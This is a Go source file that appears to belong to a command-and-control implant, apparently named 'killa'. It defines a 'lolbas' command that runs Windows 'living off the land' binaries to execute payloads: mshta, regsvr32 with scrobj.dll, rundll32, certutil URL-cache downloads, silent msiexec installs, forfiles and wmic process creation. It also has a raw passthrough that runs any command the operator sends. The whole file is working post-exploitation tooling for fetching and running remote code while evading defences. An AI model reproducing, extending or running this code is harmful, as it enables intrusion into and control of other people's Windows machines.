package commands

import (
	"encoding/json"
	"fmt"
	"sort"
	"strings"

	"killa/pkg/structs"
)

// LolbasCommand executes common LOLBAS execution chains on Windows.
type LolbasCommand struct{}

type lolbasArgs struct {
	Action  string `json:"action"`
	Binary  string `json:"binary"`
	Target  string `json:"target"`
	Args    string `json:"args"`
	Command string `json:"command"`
}

func (c *LolbasCommand) Name() string { return "lolbas" }
func (c *LolbasCommand) Description() string {
	return "Execute payloads/commands via common LOLBAS binaries"
}

func (c *LolbasCommand) Execute(task structs.Task) structs.CommandResult {
	params := strings.TrimSpace(task.Params)
	if params == "" {
		return structs.CommandResult{Output: "Error: missing parameters", Status: "error", Completed: true}
	}

	// Optional raw passthrough for operators that want exact syntax.
	if strings.HasPrefix(params, "raw:") {
		out, err := executeRunCommand(strings.TrimSpace(strings.TrimPrefix(params, "raw:")))
		if err != nil {
			return structs.CommandResult{Output: fmt.Sprintf("%s\nError: %v", strings.TrimSpace(out), err), Status: "error", Completed: true}
		}
		if strings.TrimSpace(out) == "" {
			out = "LOLBAS command executed (no output)"
		}
		return structs.CommandResult{Output: strings.TrimSpace(out), Status: "success", Completed: true}
	}

	var a lolbasArgs
	if err := json.Unmarshal([]byte(params), &a); err != nil {
		return structs.CommandResult{Output: "Error: expected JSON args or raw:<command>", Status: "error", Completed: true}
	}
	if a.Action == "" {
		a.Action = "exec"
	}
	if strings.EqualFold(a.Action, "list") {
		keys := make([]string, 0, len(lolbasTemplates))
		for k := range lolbasTemplates {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		return structs.CommandResult{Output: "Available LOLBAS templates: " + strings.Join(keys, ", "), Status: "success", Completed: true}
	}

	if !strings.EqualFold(a.Action, "exec") {
		return structs.CommandResult{Output: "Error: action must be list or exec", Status: "error", Completed: true}
	}
	if a.Binary == "" {
		return structs.CommandResult{Output: "Error: binary is required for action=exec", Status: "error", Completed: true}
	}

	render, ok := lolbasTemplates[strings.ToLower(a.Binary)]
	if !ok {
		return structs.CommandResult{Output: fmt.Sprintf("Error: unsupported binary %q", a.Binary), Status: "error", Completed: true}
	}
	cmdLine, err := render(strings.TrimSpace(a.Target), strings.TrimSpace(a.Args), strings.TrimSpace(a.Command))
	if err != nil {
		return structs.CommandResult{Output: "Error: " + err.Error(), Status: "error", Completed: true}
	}

	out, runErr := executeRunCommand(cmdLine)
	if runErr != nil {
		trimmed := strings.TrimSpace(out)
		if trimmed == "" {
			trimmed = "(no output)"
		}
		return structs.CommandResult{Output: fmt.Sprintf("Template: %s\nCommand: %s\nOutput: %s\nError: %v", a.Binary, cmdLine, trimmed, runErr), Status: "error", Completed: true}
	}
	if strings.TrimSpace(out) == "" {
		out = "(no output)"
	}
	return structs.CommandResult{Output: fmt.Sprintf("Template: %s\nCommand: %s\nOutput: %s", a.Binary, cmdLine, strings.TrimSpace(out)), Status: "success", Completed: true}
}

var lolbasTemplates = map[string]func(target, args, command string) (string, error){
	"mshta": func(target, args, command string) (string, error) {
		if target == "" {
			return "", fmt.Errorf("target is required for mshta")
		}
		return fmt.Sprintf("mshta %s %s", target, args), nil
	},
	"regsvr32": func(target, args, command string) (string, error) {
		if target == "" {
			return "", fmt.Errorf("target is required for regsvr32")
		}
		return fmt.Sprintf("regsvr32 /s /n /u /i:%s scrobj.dll %s", target, args), nil
	},
	"rundll32": func(target, args, command string) (string, error) {
		if target == "" {
			return "", fmt.Errorf("target is required for rundll32")
		}
		return fmt.Sprintf("rundll32 %s %s", target, args), nil
	},
	"certutil": func(target, args, command string) (string, error) {
		if target == "" || args == "" {
			return "", fmt.Errorf("target (url/source) and args (destination file) are required for certutil")
		}
		return fmt.Sprintf("certutil -urlcache -split -f %s %s", target, args), nil
	},
	"msiexec": func(target, args, command string) (string, error) {
		if target == "" {
			return "", fmt.Errorf("target is required for msiexec")
		}
		if args == "" {
			args = "/qn"
		}
		return fmt.Sprintf("msiexec /i %s %s", target, args), nil
	},
	"forfiles": func(target, args, command string) (string, error) {
		if command == "" {
			return "", fmt.Errorf("command is required for forfiles")
		}
		if target == "" {
			target = "."
		}
		return fmt.Sprintf("forfiles /P %s /M * /C \"cmd /c %s\" %s", target, command, args), nil
	},
	"wmic": func(target, args, command string) (string, error) {
		if command == "" {
			return "", fmt.Errorf("command is required for wmic")
		}
		return fmt.Sprintf("wmic process call create \"%s\" %s", command, args), nil
	},
}
